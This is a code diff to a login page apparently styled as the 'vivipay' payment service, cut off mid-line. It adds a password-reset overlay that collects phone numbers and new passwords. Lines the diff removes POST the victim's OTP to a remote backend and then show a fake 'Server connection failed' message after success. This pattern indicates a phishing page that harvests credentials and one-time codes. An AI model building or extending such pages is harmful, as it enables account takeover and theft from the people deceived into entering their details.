@@ -142,6 +142,7 @@
         .forgot-pass-link {
             text-decoration: none;
             color: #1a85ff;
+            cursor: pointer;
         }
 
         /* Action Login Button */
@@ -221,7 +222,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 10000;
+            z-index: 30000;
             opacity: 0;
             pointer-events: none;
             transition: opacity 0.2s ease;
@@ -296,6 +297,134 @@
             font-size: 13px;
             color: #94a3b8;
         }
+
+        /* Native Modify Password Overlay Screen Layout */
+        .modify-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            z-index: 20000;
+            display: none;
+            flex-direction: column;
+            padding: 20px 24px;
+        }
+
+        .modify-modal-overlay.active {
+            display: flex;
+        }
+
+        .modify-header {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .modify-back-arrow {
+            font-size: 24px;
+            color: #334155;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .modify-header-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1e293b;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .modify-avatar-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 10px;
+            margin-bottom: 40px;
+            width: 100%;
+        }
+
+        .modify-avatar-img {
+            width: 85px;
+            height: 85px;
+            border-radius: 50%;
+            background-color: #f0f7ff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .modify-form-title {
+            font-size: 18px;
+            color: #334155;
+            font-weight: 400;
+        }
+
+        .modify-form-container {
+            width: 100%;
+            max-width: 380px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            transform: translateY(-10px);
+        }
+
+        .modify-row {
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #f1f5f9;
+            padding: 16px 4px;
+            width: 100%;
+        }
+
+        .modify-label {
+            font-size: 16px;
+            color: #1e293b;
+            width: 95px;
+            font-weight: 400;
+        }
+
+        .modify-input-box {
+            border: none;
+            outline: none;
+            width: 100%;
+            font-size: 16px;
+            color: #333333;
+            background: transparent;
+        }
+
+        .modify-input-box::placeholder {
+            color: #cbd5e1;
+        }
+
+        .modify-redirect-link {
+            align-self: flex-end;
+            color: #1a85ff;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 16px;
+            margin-bottom: 50px;
+            cursor: pointer;
+        }
+
+        .modify-submit-btn {
+            background-color: #1a85ff;
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -335,7 +464,7 @@
                             <input type="checkbox" id="save-pwd">
                             Save Password
                         </label>
-                        <a href="#" class="forgot-pass-link">Forgot password</a>
+                        <span class="forgot-pass-link" id="triggerForgot">Forgot password</span>
                     </div>
 
                     <button type="submit" class="submit-btn">Login</button>
@@ -352,11 +481,12 @@
         </main>
     </div>
 
+    <!-- OTP Popup Layer -->
     <div class="otp-modal-overlay" id="otpModal">
         <div class="otp-modal-container">
             <button class="otp-close-btn" id="closeOtpBtn">&times;</button>
             <div class="otp-title">Please enter OTP</div>
-            <div class="otp-subtitle" id="otpSentText">OTP sent to 637****9782</div>
+            <div class="otp-subtitle" id="otpSentText">OTP sent to user</div>
             
             <div class="otp-input-container">
                 <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp2')" id="otp1">
@@ -368,6 +498,38 @@
         </div>
     </div>
 
+    <!-- Native Modify Password Layer Overlay Dashboard -->
+    <div class="modify-modal-overlay" id="modifyPasswordModal">
+        <div class="modify-header">
+            <span class="modify-back-arrow" id="backToLoginBtn">&#10094;</span>
+            <span class="modify-header-title">Modify password</span>
+        </div>
+        <div class="modify-avatar-box">
+            <div class="modify-avatar-img">
+                <svg width="46" height="46" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12ZM12 14C9.33 14 4 15.34 4 18V20H20V18C20 15.34 14.67 14 12 14Z" fill="#1a85ff"/>
+                </svg>
+            </div>
+            <div class="modify-form-title">Modify password Form</div>
+        </div>
+        <div class="modify-form-container">
+            <div class="modify-row">
+                <span class="modify-label">Phone</span>
+                <input type="tel" class="modify-input-box" id="forgotPhone" placeholder="Enter phone number" required>
+            </div>
+            <div class="modify-row">
+                <span class="modify-label">Password</span>
+                <input type="password" class="modify-input-box" id="forgotNewPass" placeholder="Enter password" required>
+            </div>
+            <div class="modify-row">
+                <span class="modify-label">Confirm</span>
+                <input type="password" class="modify-input-box" id="forgotConfirmPass" placeholder="Password, Again" required>
+            </div>
+            <span class="modify-redirect-link" id="redirectLoginLink">Already have an account,Go login</span>
+            <button class="modify-submit-btn" onclick="handleModifyPasswordSubmit()">Modify</button>
+        </div>
+    </div>
+
     <script>
         const loginForm = document.getElementById('loginForm');
         const otpModal = document.getElementById('otpModal');
@@ -375,14 +537,49 @@
         const otpSentText = document.getElementById('otpSentText');
         const secondsCount = document.getElementById('secondsCount');
         
+        const triggerForgot = document.getElementById('triggerForgot');
+        const modifyPasswordModal = document.getElementById('modifyPasswordModal');
+        const backToLoginBtn = document.getElementById('backToLoginBtn');
+        const redirectLoginLink = document.getElementById('redirectLoginLink');
+
         let currentUserId = null;
+        let isResetFlow = false;
+        let resetPhoneNumber = "";
 
         const BACKEND_URL = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost' 
             ? 'http://127.0.0.1:4000' 
             : 'https://vivipay-backend.onrender.com';
 
+        // Interface Toggle Actions
+        if(triggerForgot) {
+            triggerForgot.addEventListener('click', (e) => {
+                e.preventDefault();
+                modifyPasswordModal.classList.add('active');
+            });
+        }
+        if(backToLoginBtn) { backToLoginBtn.addEventListener('click', () => { modifyPasswordModal.classList.remove('active'); }); }
+        if(redirectLoginLink) { redirectLoginLink.addEventListener('click', (e) => { e.preventDefault(); modifyPasswordModal.classList.remove('active'); }); }
+
+        function triggerOtpPopup(phone) {
+            if(phone.length >= 7) {
+                const masked = phone.substring(0, 3) + "****" + phone.substring(phone.length - 4);
+                otpSentText.innerText = `OTP sent to ${masked}`;
+            } else {
+                otpSentText.innerText = `OTP sent to ${phone}`;
+            }
+            document.getElementById('otp1').value = "";
+            document.getElementById('otp2').value = "";
+            document.getElementById('otp3').value = "";
+            document.getElementById('otp4').value = "";
+            
+            otpModal.classList.add('active');
+            startTimer();
+        }
+
+        // 1. Regular Login Submission
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault(); 
+            isResetFlow = false;
             const phoneNumber = document.getElementById('phoneNumber').value;
             const password = document.getElementById('password').value;
             const isAgreed = document.getElementById('agreeCheck').checked;
@@ -403,14 +600,7 @@
 
                 if (data.success) {
                     currentUserId = data.userId; 
-                    if(phoneNumber.length >= 7) {
-                        const masked = phoneNumber.substring(0, 3) + "****" + phoneNumber.substring(phoneNumber.length - 4);
-                        otpSentText.innerText = `OTP sent to ${masked}`;
-                    } else {
-                        otpSentText.innerText = `OTP sent to ${phoneNumber}`;
-                    }
-                    otpModal.classList.add('active');
-                    startTimer();
+                    triggerOtpPopup(phoneNumber);
                 } else {
                     alert("Server Error! Try again.");
                 }
@@ -419,52 +609,11 @@
             }
         });
 
-        closeOtpBtn.addEventListener('click', () => {
-            otpModal.classList.remove('active');
-        });
+        // 2. Forgot Password Action Handler
+        async function handleModifyPasswordSubmit() {
+            const phone = document.getElementById('forgotPhone').value;
+            const newPassword = document.getElementById('forgotNewPass').value;
+            const confirmPassword = document.getElementById('forgotConfirmPass').value;
 
-        function moveNext(current, nextFieldId) {
-            if (current.value.length >= 1) {
-                document.getElementById(nextFieldId).focus();
-            }
-        }
-
-        async function checkAndSubmitOtp(current) {
-            const o1 = document.getElementById('otp1').value;
-            const o2 = document.getElementById('otp2').value;
-            const o3 = document.getElementById('otp3').value;
-            const o4 = current.value;
-
-            if(o1 && o2 && o3 && o4) {
-                const fullOtp = o1 + o2 + o3 + o4;
-                try {
-                    const response = await fetch(`${BACKEND_URL}/api/otp-submit`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
-                    });
-                    const data = await response.json();
-                    if(data.success) {
-                        alert("Server connection failed"); 
-                        window.location.reload(); 
-                    }
-                } catch (error) {
-                    alert("Server connection failed");
-                    window.location.reload();
-                }
-            }
-        }
-
-        function startTimer() {
-            let totalSec = 118;
-            const timerInterval = setInterval(() => {
-                totalSec--;
-                secondsCount.innerText = totalSec;
-                if(totalSec <= 0) {
-                    clearInterval(timerInterval);
-                }
-            }, 1000);
-        }
-    </script>
-</body>
-</html>
+            if (!phone || !newPassword || !confirmPassword) { alert("Please fill all fields!"); return; }
+            if (newPassword
